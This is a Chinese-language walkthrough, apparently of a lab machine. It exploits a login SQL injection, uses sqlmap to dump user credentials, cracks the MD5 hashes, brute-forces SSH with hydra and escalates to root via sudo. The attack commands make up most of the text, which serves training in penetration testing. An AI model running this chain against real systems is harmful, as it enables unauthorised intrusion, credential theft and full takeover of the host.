
# 0x00环境
攻击机IP：192.168.1.28<br />目标机IP：192.168.1.136


# 0x01实战

## 端口扫描
```
nmap -sV-A -p- 192.168.1.136
```

![](https://img-blog.csdnimg.cn/06f9bb21f26e4248bf200e0bbe90e8aa.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=LvD0x&originHeight=830&originWidth=789&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

可以看到开放了很多端口，其中80、8080、901、10000是http服务，那么我们就先去尝试访问这几个端口<br />`http://192.168.1.136/`就是正常的Web页面<br />![](https://img-blog.csdnimg.cn/0ca90ba913004f3596faf83fc49aea45.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=tkPKj&originHeight=762&originWidth=1794&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


`http://192.168.1.136:8080/login.php`是一个登录的页面

![](https://img-blog.csdnimg.cn/1028febb4172421a9e60ef9ca7f7e6fe.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=Zx4UF&originHeight=497&originWidth=1020&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

`http://192.168.1.136:901/`也是需要登录才能查看

![](https://img-blog.csdnimg.cn/5337157f858f402d9582632b163cb00a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=n3623&originHeight=505&originWidth=1376&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

`http://192.168.1.136:10000/`也是一个登录页面，尝试了万能密码无法绕过。

![](https://img-blog.csdnimg.cn/6ba0266e8dd54622a16dc4a8a5b6e37b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=dynnf&originHeight=451&originWidth=1390&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


## 漏洞发现
经过长时间的查找发现在`http://192.168.1.136:8080/login.php`处存在SQL注入可以使用万能密码绕过<br />![](https://img-blog.csdnimg.cn/be9802c3e1d34272a83fa13224469837.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_15,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=mCizj&originHeight=363&originWidth=528&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

成功登录<br />![](https://img-blog.csdnimg.cn/b606382ad9ab46d894518f4fd09fdf12.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=xHDqE&originHeight=349&originWidth=1269&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


## 漏洞利用
使用sqlmap跑一下，使用burp抓包，将数据包保存并命名为sql.txt<br />暴库
```
sqlmap -r sql.txt --dbs
```
![](https://img-blog.csdnimg.cn/c23052c979e3483e8df59454a86eb176.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=zkUAb&originHeight=700&originWidth=1134&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

![](https://img-blog.csdnimg.cn/58985710aa4d41bb84783ace3506c6d4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=YmU5k&originHeight=376&originWidth=711&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

爆表
```
sqlmap -r sql.txt -D website --tables
```
![](https://img-blog.csdnimg.cn/7bdef8dc27bb41658851d5614804493c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_12,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=UtB1i&originHeight=354&originWidth=428&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

暴字段
```
sqlmap -r sql.txt -D website -T users --columns
```
![](https://img-blog.csdnimg.cn/c5e9565ccaaa4da583cca7f7560e88bd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_14,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=msEeV&originHeight=368&originWidth=504&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

拖库
```
sqlmap -r sql.txt -D website -T users -C username,password --dump
```
![](https://img-blog.csdnimg.cn/beb300253f6b4d0587ed4469e283b0b1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=Df7Dm&originHeight=483&originWidth=1087&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

将用户名和密码拖下来分别保存为username.txt和password.txt，使用john破解密码
```
john --format=Raw-MD5 password.txt
```
![](https://img-blog.csdnimg.cn/4b388e2fa5f64674947192422d4c56d0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=y7xZE&originHeight=446&originWidth=1173&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

太慢了还是使用网站

- [https://www.cmd5.com/](https://www.cmd5.com/)
- [https://www.somd5.com/](https://www.somd5.com/)

最终结果<br />![](https://img-blog.csdnimg.cn/52a35d18a5e149a597417b9f1ef4cd4f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_9,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=NTkbD&originHeight=361&originWidth=349&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

将得到的明文密码保存为password2.txt，使用hydra进行爆破
```
hydra -L username.txt -P password2.txt -t 4 192.168.1.136 ssh
```

![](https://img-blog.csdnimg.cn/08dfa2d7ca76425fa864c0974eb774a9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=ASgoS&originHeight=513&originWidth=1224&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

在前面的端口扫描中我们看到开放了22-SSH端口，尝试登录，登录成功。<br />![](https://img-blog.csdnimg.cn/30b75a45a7ab465283793cad45de1489.png#crop=0&crop=0&crop=1&crop=1&id=j5aRB&originHeight=170&originWidth=1272&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


## 提权
查看当前用户可以使用的sudo权限
```
sudo -l
```
![](https://img-blog.csdnimg.cn/82bb7e6bc7ea435db42589231a1fb2ed.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=JCf6W&originHeight=462&originWidth=1018&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

可以看到当前用户可以以root身份运行所有命令<br />尝试使用`sudo su`提升权限，成功拿到root权限
```
sudo su
```
![](https://img-blog.csdnimg.cn/4577f6127e8f44cfa957328978c49d75.png#crop=0&crop=0&crop=1&crop=1&id=shZZf&originHeight=147&originWidth=1202&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
